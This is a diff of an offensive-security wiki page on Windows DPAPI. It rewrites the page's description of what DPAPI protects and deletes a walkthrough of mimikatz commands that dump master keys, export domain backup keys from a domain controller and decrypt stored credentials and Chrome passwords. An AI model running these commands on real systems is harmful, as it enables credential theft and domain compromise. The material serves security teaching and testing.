@@ -18,35 +18,21 @@
 
 {% embed url="https://www.rootedcon.com/" %}
 
-While creating this post mimikatz was having problems with every action that interacted with DPAPI therefore **most of the examples and images were taken from**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)
 
 ## What is DPAPI
 
-Its primary use in the Windows operating system is to **perform symmetric encryption of asymmetric private keys**, using a user or system secret as a significant contribution of entropy.\
-**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.
+The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.
 
-This makes very easy to developer to **save encrypted data** in the computer **without** needing to **worry** how to **protect** the **encryption** **key**.
+### Protected Data by DPAPI
 
-### What does DPAPI protect?
+Among the personal data protected by DPAPI are:
 
-DPAPI is utilized to protect the following personal data:
+- Internet Explorer and Google Chrome's passwords and auto-completion data
+- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
+- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
+- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
+- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
 
-* Passwords and form auto-completion data in Internet Explorer, Google \*Chrome
-* E-mail account passwords in Outlook, Windows Mail, etc.
-* Internal FTP manager account passwords
-* Shared folders and resources access passwords
-* Wireless network account keys and passwords
-* Encryption key in Windows CardSpace and Windows Vault
-* Remote desktop connection passwords, .NET Passport
-* Private keys for Encrypting File System (EFS), encrypting mail S-MIME, other user's certificates, SSL/TLS in Internet Information Services
-* EAP/TLS and 802.1x (VPN and WiFi authentication)
-* Network passwords in Credential Manager
-* Personal data in any application programmatically protected with the API function CryptProtectData. For example, in Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk etc.
-* ...
-
-{% hint style="info" %}
-An example of a successful and clever way to protect data using DPAPI is the implementation of the auto-completion password encryption algorithm in Internet Explorer. To encrypt the login and password for a certain web page, it calls the CryptProtectData function, where in the optional entropy parameter it specifies the address of the web page. Thus, unless one knows the original URL where the password was entered, nobody, not even Internet Explorer itself, can decrypt that data back.
-{% endhint %}
 
 ## List Vault
 
@@ -60,7 +46,7 @@ mimikatz vault::list
 
 ## Credential Files
 
-The **credentials files protected by the master password** could be located in:
+The **credentials files protected** could be located in:
 
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
@@ -108,68 +94,8 @@ Usually **each master keys is an encrypted symmetric key that can decrypt other 
 
 ### Extract master key & decrypt
 
-In the previous section we found the guidMasterKey which looked like `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, this file will be inside:
+Check the post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) for an example of how to extract the master key and decrypt it.
 
-```
-C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
-```
-
-You can extract the master key with mimikatz:
-
-```bash
-# If you know the users password
-dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
-
-# If you don't have the users password and inside an AD
-dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
-```
-
-The master key of the file will appear in the output.
-
-Finally, you can use that **masterkey** to **decrypt** the **credential file**:
-
-```
-mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
-```
-
-### Extract all local Master Keys with Administrator
-
-If you are administrator you can obtain the dpapi master keys using:
-
-```
-sekurlsa::dpapi
-```
-
-![](<../../.gitbook/assets/image (326).png>)
-
-### Extract all backup Master Keys with Domain Admin
-
-A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:
-
-```
-lsadump::backupkeys /system:dc01.offense.local /export
-```
-
-![](<../../.gitbook/assets/image (327).png>)
-
-Using the retrieved backup key, let's decrypt user's `spotless` master key:
-
-```bash
-dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
-```
-
-We can now decrypt user's `spotless` chrome secrets using their decrypted master key:
-
-```
-dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
-```
-
-![](<../../.gitbook/assets/image (329).png>)
-
-## Encrypting and Decrypting content
-
-You can find an example of how to encrypt and decrypt data with DAPI using mimikatz and C++ in [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
-You can find an example on how to encrypt and decrypt data with DPAPI using C# in [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)
 
 ## SharpDPAPI
 
